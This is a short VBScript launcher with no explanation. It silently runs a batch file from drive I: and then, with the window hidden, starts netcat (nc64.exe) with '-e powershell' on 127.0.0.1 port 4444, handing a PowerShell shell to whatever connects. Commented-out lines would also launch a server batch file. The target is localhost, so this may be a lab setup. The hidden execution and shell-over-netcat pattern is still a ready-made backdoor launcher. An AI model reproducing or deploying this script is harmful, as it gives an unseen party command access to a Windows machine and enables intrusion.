Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run chr(34) & "I:\start.bat" & Chr(34), 0
Set WshShell = Nothing

Set WshShell = WScript.CreateObject( "WScript.Shell" )
WshShell.Run chr(34) & "I:\nc64.exe 127.0.0.1 4444 -e powershell" & Chr(34), 0
Set WshShell = Nothing

Rem Server not needed with nc
Rem Wscript.sleep 10000
Rem Set WshShell = CreateObject("WScript.Shell")
Rem WshShell.Run chr(34) & "I:\server.bat" & Chr(34), 0
Rem Set WshShell = Nothing
